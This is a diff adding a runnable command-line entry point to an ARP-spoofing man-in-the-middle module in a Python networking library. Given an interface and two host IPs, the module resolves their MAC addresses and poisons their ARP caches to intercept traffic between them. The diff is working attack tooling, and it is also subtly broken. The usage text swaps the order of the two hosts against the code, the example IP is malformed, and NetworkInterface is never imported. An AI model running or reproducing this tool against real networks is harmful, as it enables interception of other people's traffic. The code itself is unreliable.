+++ agave/arp/mitm.py
@@ -56,3 +56,47 @@ class MITM(ARPReaderLoop):
 	def run(self):
 		self.send_gratuitous()
 		super().run()
+
+
+if __name__ == "__main__":
+	"""
+	Man in the middle using ARP reply spoofing.
+
+	Usage:
+		python3 -m agave.arp.mitm <interface> <bob IPv4> <alice IPv4>
+
+	Example:
+		python3 -m agave.arp.mitm eth0 192.168.1 192.168.1.2
+
+	"""
+	import sys
+	from ipaddress import IPv4Address
+	from agave.modules.nic.interfaces import NetworkInterfaceNotFound
+	from agave.arp.resolve import resolve
+
+	
+	try:
+		print("Resolving addresses ...")
+		interface = NetworkInterface.get_by_name(sys.argv[1])
+		alice_ip = IPv4Address(sys.argv[2])
+		alice_mac = resolve(interface, alice_ip)
+		if alice_mac is None:
+			print("Unable to resolve mac for {}".format(alice_ip))
+			exit(0)
+		print("Resolved {} to {}".format(alice_ip, alice_mac))
+		bob_ip = IPv4Address(sys.argv[3])
+		bob_mac = resolve(interface, bob_ip)
+		if bob_mac is None:
+			print("Unable to resolve mac for {}".format(bob_ip))
+			exit(0)
+		print("Resolved {} to {}".format(bob_ip, bob_mac))
+		print("Running ...")
+		MITM(
+			interface,
+			(alice_mac, alice_ip),
+			(bob_mac, bob_ip)
+		).run()
+	except NetworkInterfaceNotFound as e:
+		print(e)
+	except KeyboardInterrupt as e:
+		pass
